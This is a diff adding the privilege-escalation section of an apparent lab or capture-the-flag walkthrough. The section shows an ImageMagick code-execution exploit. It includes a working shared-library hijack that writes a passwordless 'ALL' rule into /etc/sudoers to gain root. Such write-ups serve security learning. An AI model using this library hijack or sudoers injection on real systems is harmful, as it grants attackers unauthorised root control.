@@ -134,8 +134,51 @@ developer:x:1000:1000:developer:/home/developer:/bin/bash
 
 -----------------
 
+- I discovered this script in `/opt/scripts` that identify images with the `Image magick` binary.
+
+![image](https://github.com/user-attachments/assets/86c903bb-3a5e-4a37-a70f-146f741e4f18)
+
+- This version of image magick is vulnerable to Code Execution as explained here [Image Magick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).
+
+![image](https://github.com/user-attachments/assets/784dd5a2-816c-4bc2-b9cd-d805ed93aa97)
+
+
+- I tweaked the POC to grant root privileges by adding an `all` rule to the `/etc/sudoers` file.
+
+```bash
+gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+  system("echo 'developer ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers");
+  exit(0);
+}
+EOF
+```
+- I ran `sudo -l` to confirm if the rule has been added.
+
+![image](https://github.com/user-attachments/assets/9bd940f9-275b-40d7-9dd7-14f87350583f)
+
+- Root-:
+
+![image](https://github.com/user-attachments/assets/387ad12a-6e87-4b98-a70e-2079c3503a6c)
 
 -----------------
+
+### THANKS FOR READING
+
+-----------------
+
+### REFERENCES-:
+
+-----------------
+
+- [Image Magick Code Execution](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
+
+-----------------
+
 
 
 
